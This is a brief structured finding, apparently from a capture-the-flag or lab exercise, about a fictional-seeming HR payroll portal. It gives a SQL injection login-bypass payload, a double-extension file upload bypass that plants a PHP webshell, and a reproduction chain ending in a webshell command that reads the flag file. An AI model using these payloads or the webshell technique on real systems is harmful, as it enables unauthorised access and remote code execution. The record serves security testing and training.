findings.title: Boolean-based Blind SQLi leading to RCE via File Upload Bypass
findings.description: The PayBuddies HR payroll portal is vulnerable to Boolean-based Blind SQL Injection in the login form. The password field accepts injection payload `'))) OR 1=1-- -` which bypasses authentication. After login, the file upload feature only checks client-side and server-side file extensions, allowing double-extension bypass (shell.pdf.php) to upload a PHP webshell. This leads to remote code execution and flag extraction.

reproduction.command: POST /index.php with username=admin&password='))) OR 1=1-- -' to bypass login, then POST /upload.php with file shell.pdf.php containing PHP webshell, then GET /uploaded_invoices/shell.pdf.php?cmd=cat%20/FLAG.txt
